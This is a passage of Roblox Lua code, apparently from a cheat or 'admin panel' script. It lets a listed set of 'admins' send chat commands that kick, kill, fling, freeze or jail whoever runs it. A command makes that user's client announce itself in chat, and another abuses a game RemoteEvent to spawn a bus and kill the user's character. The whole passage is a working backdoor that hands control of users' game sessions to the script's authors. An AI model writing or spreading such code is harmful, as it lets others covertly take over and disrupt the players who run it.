end

TextChatService.OnIncomingMessage = function(message)
    if not message or not message.TextSource or not message.Text then return end
    if not allowedAdmins[message.TextSource.Name] then return end

    local msgText = tostring(message.Text):lower()
    local playerName = LocalPlayer.Name:lower()
    local character = LocalPlayer.Character
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")

    if msgText:match(";kick%s+" .. playerName) then
        LocalPlayer:Kick("Kicked by SABNOX Admin panel.")
    elseif msgText:match(";kill%s+" .. playerName) then
        if character then character:BreakJoints() end
    elseif msgText:match(";killplus%s+" .. playerName) then
        if character then
            character:BreakJoints()
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                for i = 1, 10 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(10,10,10)
                    part.Anchored = false
                    part.CanCollide = false
                    part.Material = Enum.Material.Neon
                    part.BrickColor = BrickColor.Random()
                    part.CFrame = root.CFrame
                    part.Parent = workspace
                    local bv = Instance.new("BodyVelocity")
                    bv.Velocity = Vector3.new(math.random(-50,50), math.random(20,80), math.random(-50,50))
                    bv.MaxForce = Vector3.new(1e5, 1e5, 1e5)
                    bv.Parent = part
                    game:GetService("Debris"):AddItem(part, 3)
                end
            end
        end
    elseif msgText:match(";fling%s+" .. playerName) then
        if character then
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                local targetCFrame = CFrame.new(50000, 5000000, 3972823)
                local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear)
                local okTween = TweenService:Create(root, tweenInfo, {CFrame = targetCFrame})
                okTween:Play()
            end
        end
    elseif msgText:match(";freeze%s+" .. playerName) then
        if humanoid then humanoid.WalkSpeed = 0 end
    elseif msgText:match(";jail%s+" .. playerName) then
        local char = character or LocalPlayer.CharacterAdded:Wait()
        local hrp = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hrp and hum then
            local JailSize = Vector3.new(10, 8, 10)
            local WallThickness = 1
            local Material = Enum.Material.Ice
            local Color = Color3.fromRGB(80, 180, 255)
            local Transparency = 0.5

            hum.WalkSpeed = 0
            hum.JumpPower = 0
            hum.PlatformStand = true

            local oldJail = workspace:FindFirstChild("BlueIceJail")
            if oldJail then oldJail:Destroy() end

            local jail = Instance.new("Model", workspace)
            jail.Name = "BlueIceJail"

            local function makePart(size, cf)
                local p = Instance.new("Part")
                p.Anchored = true
                p.CanCollide = true
                p.Material = Material
                p.Color = Color
                p.Transparency = Transparency
                p.Size = size
                p.CFrame = cf
                p.Parent = jail
                return p
            end

            local pos = hrp.Position
            local half = JailSize / 2

            makePart(Vector3.new(JailSize.X, 1, JailSize.Z), CFrame.new(pos - Vector3.new(0, half.Y, 0)))
            makePart(Vector3.new(JailSize.X, 1, JailSize.Z), CFrame.new(pos + Vector3.new(0, half.Y, 0)))
            makePart(Vector3.new(1, JailSize.Y, JailSize.Z), CFrame.new(pos + Vector3.new(half.X, 0, 0)))
            makePart(Vector3.new(1, JailSize.Y, JailSize.Z), CFrame.new(pos - Vector3.new(half.X, 0, 0)))
            makePart(Vector3.new(JailSize.X, JailSize.Y, 1), CFrame.new(pos + Vector3.new(0, 0, half.Z)))
            makePart(Vector3.new(JailSize.X, JailSize.Y, 1), CFrame.new(pos - Vector3.new(0, 0, half.Z)))

            if _G.jailConn then _G.jailConn:Disconnect() end
            _G.jailConn = game:GetService("RunService").RenderStepped:Connect(function()
                if hrp and hrp.Parent then
                    hrp.CFrame = CFrame.new(pos + Vector3.new(0, 2, 0))
                end
            end)
        end
    elseif msgText:match(";unjail%s+" .. playerName) then
        local char = character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.WalkSpeed = 16
            hum.JumpPower = 50
            hum.PlatformStand = false
        end
        local jail = workspace:FindFirstChild("BlueIceJail")
        if jail then jail:Destroy() end
        if _G.jailConn then _G.jailConn:Disconnect() _G.jailConn = nil end
    elseif msgText:match(";verifique") then
        local channels = TextChatService:FindFirstChild("TextChannels")
        local channel = channels and channels:FindFirstChild("RBXGeneral")
        if channel and type(channel.SendAsync) == "function" then
            local randomNumber = math.random(1000, 9999)
            local verificationMessage = "Shadow is back" .. randomNumber
            channel:SendAsync(verificationMessage)
        end
    elseif msgText:match(";killwithbus%s+" .. playerName) then
        local player = LocalPlayer
        local char = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = char:WaitForChild("HumanoidRootPart")
        local function GetBus()
            local vehicles = workspace:FindFirstChild("Vehicles")
            if vehicles then
                return vehicles:FindFirstChild(player.Name .. "Car")
            end
            return nil
        end
        local bus = GetBus()
        if not bus then
            humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
            task.wait(0.5)
            local remoteEvent = ReplicatedStorage:FindFirstChild("RE")
            if remoteEvent and remoteEvent:FindFirstChild("1Ca1r") then
                remoteEvent["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
            end
            task.wait(1)
            bus = GetBus()
        end
        if bus then
            local seat = bus:FindFirstChild("Body") and bus.Body:FindFirstChild("VehicleSeat")
            if seat and char:FindFirstChildOfClass("Humanoid") and not char.Humanoid.Sit then
                repeat
                    humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)
                    task.wait()
                until char.Humanoid.Sit or not bus.Parent
            end
        end
        local function TrackPlayer()
            local voidPosition = Vector3.new(0, -500, 0)
            local targetPlayer = Players:FindFirstChild(playerName)
            if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local targetHumanoid = targetPlayer.Character:FindFirstChildOfClass("Humanoid")
                if targetHumanoid and targetHumanoid.Sit then
                    if bus and bus:IsDescendantOf(workspace) then
                        if bus.PrimaryPart then
                            bus:SetPrimaryPartCFrame(CFrame.new(voidPosition))
                        else
                            local primary = bus:FindFirstChildWhichIsA("BasePart") or bus:FindFirstChild("Body") or bus:FindFirstChild("Chassis")
                            if primary then
                                primary.CFrame = CFrame.new(voidPosition)
                            end
                        end
                        task.wait(0.2)
                        bus:Destroy()
                    end
                    return true
                end
            end
            return false
        end
        local watchdog = 0
        while watchdog < 60 do
            local ok, done = pcall(TrackPlayer)
            if ok and done then break end
            task.wait(0.5)
            watchdog = watchdog + 0.5
            if not (bus and bus.Parent) then
                bus = GetBus()
            end
        end
    end
end

